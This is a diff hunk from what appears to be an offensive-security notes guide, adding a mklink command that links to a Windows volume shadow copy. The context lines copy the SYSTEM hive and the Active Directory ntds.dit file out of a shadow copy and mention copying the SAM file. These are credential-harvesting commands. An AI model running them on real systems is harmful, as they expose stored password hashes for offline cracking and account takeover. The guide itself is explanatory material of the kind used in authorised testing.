@@ -159,9 +159,11 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYS
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit
+
+# You can also create a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
-  
 But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** \(the hard drive used is "C:" and its saved to C:\users\Public\) but you can use this for copying any protected file:
 
 ```bash
